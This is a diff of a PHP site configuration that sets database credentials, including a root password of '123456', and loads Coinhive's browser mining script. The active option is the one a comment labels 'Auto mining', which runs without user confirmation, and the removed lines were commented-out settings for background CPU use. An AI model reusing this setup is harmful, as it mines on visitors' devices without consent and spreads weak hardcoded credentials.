@@ -5,11 +5,10 @@ $pdo_host = 'localhost';
 $pdo_port = 3306;
 $pdo_user = 'root';
 $pdo_pass = '123456';
-//Links table
+// Links table
 $pdo_table = 'links';
 $pdo_cookies_table = 'cookies';
 $pdo_stats_table = 'stats';
-
 //Do not touch pdo_dsn
 $pdo_dsn = 'mysql:dbname='.$pdo_database.';host='.$pdo_host.';port='.$pdo_port;
 // ==============================================================
@@ -24,16 +23,6 @@ $ch_host = 'https://coinhive.com/lib/coinhive.min.js';
 // There have 2 host you can choose
 // https://authedmine.com/lib/coinhive.min.js (AdBlock Friendly, But need user confirm)
 // https://coinhive.com/lib/coinhive.min.js (Auto mining)
-
-//$ch_enable_background_mining = true;
-// Background mining need set $ch_host to https://authedmine.com/lib/captcha.min.js
-
-//$ch_background_mining_free_percent = '0.6';
-// 0.6 = 60% cpu free(use 40%)   0.1 = 10% cpu free(use 90%)
-// Need switch $ch_enable_background_mining to true
-
-//$ch_background_mining_disable_on_mobile = true;
-//T urn on this maybe can improve mobile user experience, But possible user can use UA to disable background mining.
 // ==============================================================
 
 
